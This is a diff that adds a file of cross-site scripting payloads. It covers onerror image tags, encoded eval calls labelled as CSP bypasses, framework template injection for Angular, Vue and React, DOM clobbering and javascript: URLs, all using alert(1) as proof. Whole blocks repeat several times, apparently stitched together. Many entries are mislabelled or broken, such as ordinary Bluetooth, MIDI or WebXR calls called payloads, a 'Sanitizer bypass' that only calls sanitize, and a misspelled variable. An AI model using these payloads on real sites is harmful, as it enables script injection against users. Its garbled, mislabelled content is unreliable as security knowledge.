@@ -1,0 +1,335 @@
+# Advanced Web Components
+class XSSComponent extends HTMLElement {
+  connectedCallback() {
+    this.innerHTML = `<img src=x onerror=alert(1)>`;
+  }
+}
+customElements.define('xss-component', XSSComponent);
+document.body.appendChild(new XSSComponent());
+
+# Advanced Shadow DOM
+let shadowRoot = document.createElement('div').attachShadow({mode: 'open'});
+shadowRoot.innerHTML = `<img src=x onerror=alert(1)>`;
+document.body.appendChild(shadowRoot.host);
+
+# Advanced WebAssembly
+fetch('data:application/wasm;base64,AGFzbQEAAAABBgFgAX8BfwMCAQAHBwEDZm9vAAAK').then(response =>
+  response.arrayBuffer()
+).then(bytes =>
+  WebAssembly.instantiate(bytes)
+).then(results =>
+  alert('WebAssembly Loaded')
+);
+
+# Advanced Web Speech API
+let recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
+recognition.onresult = event => alert('Speech Recognized: ' + event.results[0][0].transcript);
+recognition.start();
+
+# Advanced Web NFC
+if ('NDEFReader' in window) {
+  const ndef = new NDEFReader();
+  ndef.scan().then(() => alert('NFC Scan Started'));
+}# Advanced Web Components
+class XSSComponent extends HTMLElement {
+  connectedCallback() {
+    this.innerHTML = `<img src=x onerror=alert(1)>`;
+  }
+}
+customElements.define('xss-component', XSSComponent);
+document.body.appendChild(new XSSComponent());
+
+# Advanced Shadow DOM
+let shadowRoot = document.createElement('div').attachShadow({mode: 'open'});
+shadowRoot.innerHTML = `<img src=x onerror=alert(1)>`;
+document.body.appendChild(shadowRoot.host);
+
+# Advanced WebAssembly
+fetch('data:application/wasm;base64,AGFzbQEAAAABBgFgAX8BfwMCAQAHBwEDZm9vAAAK').then(response =>
+  response.arrayBuffer()
+).then(bytes =>
+  WebAssembly.instantiate(bytes)
+).then(results =>
+  alert('WebAssembly Loaded')
+);
+
+# Advanced Web Speech API
+let recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
+recognition.onresult = event => alert('Speech Recognized: ' + event.results[0][0].transcript);
+recognition.start();
+
+# Advanced Web NFC
+if ('NDEFReader' in window) {
+  const ndef = new NDEFReader();
+  ndef.scan().then(() => alert('NFC Scan Started'));
+}# Modern Web XSS Payloads
+
+# Advanced Web Components
+<script>
+class XSSComponent extends HTMLElement {
+  connectedCallback() {
+    this.innerHTML = '<img src=x onerror=alert(1)>';
+  }
+}
+customElements.define('xss-component', XSSComponent);
+</script>
+<xss-component></xss-component>
+
+# Advanced Shadow DOM
+<script>
+let shadowRoot = document.createElement('div').attachShadow({mode: 'open'});
+shadowRoot.innerHTML = '<img src=x onerror=alert(1)>';
+document.body.appendChild(shadowRoot.host);
+</script>
+
+# Advanced WebAssembly
+<script>
+fetch('data:application/wasm;base64,AGFzbQEAAAABBgFgAX8BfwMCAQAHBwEDZm9vAAAK').then(response =>
+  response.arrayBuffer()
+).then(bytes =>
+  WebAssembly.instantiate(bytes)
+).then(results =>
+  alert('WebAssembly Loaded')
+);
+</script>
+
+# Advanced Service Worker
+<script>
+navigator.serviceWorker.register('data:application/javascript,alert(1)');
+</script>
+
+# Advanced WebRTC
+<script>
+let pc = new RTCPeerConnection();
+pc.createDataChannel('xss').send('alert(1)');
+</script>
+
+# Advanced Web Bluetooth
+<script>
+navigator.bluetooth.requestDevice({acceptAllDevices: true}).then(device =>
+  alert('Bluetooth Device: ' + device.name)
+);
+</script>
+
+# Advanced WebUSB
+<script>
+navigator.usb.requestDevice({filters: []}).then(device =>
+  alert('USB Device: ' + device.productName)
+);
+</script>
+
+# Advanced WebVR
+<script>
+if (navigator.getVRDisplays) {
+  navigator.getVRDisplays().then(displays =>
+    alert('VR Display: ' + displays[0].displayName)
+  );
+}
+</script>
+
+# Advanced WebXR
+<script>
+if (navigator.xr) {
+  navigator.xr.requestSession('immersive-vr').then(session =>
+    alert('XR Session Started')
+  );
+}
+</script>
+
+# Advanced Web Audio API
+<script>
+let audioContext = new (window.AudioContext || window.webkitAudioContext)();
+let oscillator = audioContext.createOscillator();
+osillator.connect(audioContext.destination);
+osillator.start();
+alert('Audio Context Started');
+</script>
+
+# Advanced Web Speech API
+<script>
+let recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
+recognition.onresult = event =>
+  alert('Speech Recognized: ' + event.results[0][0].transcript);
+recognition.start();
+</script>
+
+# Advanced Web NFC
+<script>
+if ('NDEFReader' in window) {
+  const ndef = new NDEFReader();
+  ndef.scan().then(() =>
+    alert('NFC Scan Started')
+  );
+}
+</script>
+
+# Advanced Web MIDI
+<script>
+navigator.requestMIDIAccess().then(midiAccess =>
+  alert('MIDI Access Granted')
+);
+</script>
+
+# Advanced Web Serial
+<script>
+navigator.serial.requestPort().then(port =>
+  alert('Serial Port: ' + port.getInfo().usbProductId)
+);
+</script>
+
+# Advanced Web Share
+<script>
+navigator.share({title: 'XSS', text: 'Check this out!', url: 'javascript:alert(1)'}).then(() =>
+  alert('Shared Successfully')
+);
+</script>
+
+# Advanced CSP Bypass
+<script>
+// Data URL bypass
+eval(atob('YWxlcnQoMSk='));
+
+// DOM Clobbering + CSP Bypass
+<form id="test">
+<input name="nodeType">
+<input name="tagName">
+<input name="getAttribute">
+<input name="innerHTML" value="<img src=x onerror=alert(1)>">
+</form>
+<script>
+setTimeout(function(){document.getElementById('test').innerHTML;}, 1000);
+</script>
+
+# React Framework XSS
+<script>
+// React dangerouslySetInnerHTML
+React.createElement("div", {
+  dangerouslySetInnerHTML: {
+    __html: "<img src=x onerror=alert(1)>"
+  }
+});
+
+// React href exploit
+<a href="javascript:alert(1)">Click</a>
+</script>
+
+# Vue.js Framework XSS
+<script>
+// Vue template injection
+new Vue({
+  template: '<div v-html="<img src=x onerror=alert(1)>"></div>'
+});
+
+// Vue dynamic directive
+<div v-[userInput]="javascript:alert(1)">
+</script>
+
+# Angular Framework XSS
+<script>
+// Angular template injection
+{{constructor.constructor('alert(1)')()}}
+
+// Angular bypass sanitizer
+<div [innerHTML]="bypassSecurityTrustHtml('<img src=x onerror=alert(1)>')">
+</script>
+
+# Advanced Prototype Pollution
+<script>
+// Prototype pollution leading to XSS
+Object.prototype.__proto__ = {
+  innerHTML: '<img src=x onerror=alert(1)>'
+};
+
+// Constructor pollution
+(function(){}).constructor('alert(1)')();
+</script>
+
+# Modern Browser APIs Exploitation
+<script>
+// Trusted Types bypass
+trustedTypes.createPolicy('policy', {
+  createHTML: () => '<img src=x onerror=alert(1)>'
+});
+
+// Sanitizer API bypass
+new Sanitizer().sanitize('<img src=x onerror=alert(1)>');
+
+// Permissions API abuse
+navigator.permissions.query({name:'notifications'}).then(function(result) {
+  if (result.state === 'granted') alert(1);
+});
+</script>
+
+# Advanced DOM XSS
+<script>
+// MutationObserver based
+new MutationObserver(function(){
+  alert(1);
+}).observe(document, {
+  subtree: true,
+  childList: true
+});
+
+// Intersection Observer based
+new IntersectionObserver(function(){
+  alert(1);
+}).observe(document.body);
+</script>
+
+# Modern Encoding Tricks
+<script>
+// Unicode normalization
+eval(unescape('%u0061%u006C%u0065%u0072%u0074%u0028%u0031%u0029'));
+
+// Base64 + URL encoding
+eval(decodeURIComponent(atob('YWxlcnQoMSk=')));
+
+// Template literal abuse
+eval(`${`alert\x281\x29`}`);
+</script>
+
+# Advanced Event Handlers
+<script>
+// Multiple event handlers
+onload=onmouseover=onclick=onkeypress=alert;
+
+// Error event abuse
+throw/a/,alert(1);
+
+// Promise rejection
+Promise.reject(alert(1));
+</script> 
+
+# Advanced Web Components
+class XSSComponent extends HTMLElement {
+  connectedCallback() {
+    this.innerHTML = `<img src=x onerror=alert(1)>`;
+  }
+}
+customElements.define('xss-component', XSSComponent);
+document.body.appendChild(new XSSComponent());
+
+# Advanced Shadow DOM
+let shadowRoot = document.createElement('div').attachShadow({mode: 'open'});
+shadowRoot.innerHTML = `<img src=x onerror=alert(1)>`;
+document.body.appendChild(shadowRoot.host);
+
+# Advanced WebAssembly
+fetch('data:application/wasm;base64,AGFzbQEAAAABBgFgAX8BfwMCAQAHBwEDZm9vAAAK').then(response =>
+  response.arrayBuffer()
+).then(bytes =>
+  WebAssembly.instantiate(bytes)
+).then(results =>
+  alert('WebAssembly Loaded')
+);
+
+# Advanced Web Speech API
+let recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
+recognition.onresult = event => alert('Speech Recognized: ' + event.results[0][0].transcript);
+recognition.start();
+
+# Advanced Web NFC
+if ('NDEFReader' in window) {
+  const ndef = new NDEFReader();
+  ndef.scan().then(() => alert('NFC Scan Started'));
+}
